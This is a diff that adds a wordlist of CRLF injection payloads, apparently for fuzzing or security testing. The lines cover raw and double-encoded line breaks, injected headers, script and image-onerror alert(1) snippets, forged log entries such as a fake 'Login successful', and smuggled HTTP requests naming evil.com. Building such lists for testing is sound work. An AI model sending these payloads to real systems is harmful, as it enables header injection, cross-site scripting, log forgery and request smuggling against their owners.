@@ -1,0 +1,32 @@
+%0d%0a
+%0a%0d
+%0a
+%0d
+\r\n
+\n\r
+\n
+\r
+%250d%250a
+%250a%250d
+%250a
+%250d
+%0d%0aX-Injected: true
+%0aX-Injected: true
+%0dX-Injected: true
+%0d%0aInjected-Header: true
+%0aInjected-Header: true
+%0dInjected-Header: true
+%0d%0a<script>alert(1)</script>
+%0a<script>alert(1)</script>
+%0d<script>alert(1)</script>
+%0d%0a<img src=x onerror=alert(1)>
+%0a<img src=x onerror=alert(1)>
+%0d<img src=x onerror=alert(1)>
+%0d%0a[ERROR] System compromised
+%0a[ERROR] System compromised
+%0d[ERROR] System compromised
+%0d%0aadmin%0d%0a[INFO] Login successful
+%0aadmin%0a[INFO] Login successful
+%0dadmin%0d[INFO] Login successful
+%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost: evil.com%0d%0a
+%0a%0aGET /admin HTTP/1.1%0aHost: evil.com%0a
